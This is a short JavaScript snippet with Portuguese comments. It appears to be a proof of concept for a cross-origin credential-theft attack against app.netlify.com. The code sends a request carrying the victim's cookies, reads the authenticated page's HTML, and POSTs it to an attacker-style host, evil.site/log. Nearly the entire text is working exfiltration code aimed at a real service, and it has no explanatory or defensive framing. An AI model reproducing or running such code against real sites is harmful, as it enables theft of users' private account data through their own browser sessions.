var xhr = new XMLHttpRequest();
xhr.open("GET", "https://app.netlify.com", true);  // Fazendo a requisição para o subdomínio
xhr.withCredentials = true;  // Envia cookies com a requisição CORS

xhr.onreadystatechange = function() {
  if (xhr.readyState == 4 && xhr.status == 200) {
    // A resposta contém o conteúdo HTML da página
    var htmlContent = xhr.responseText;
    
    // Exibe o conteúdo HTML no console
    console.log('Conteúdo HTML da página:', htmlContent);

    // Se você quiser enviar o conteúdo para seu servidor, pode usar fetch:
    fetch('https://evil.site/log', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ html: htmlContent })
    });
  }
};
xhr.send();  // Envia a requisição
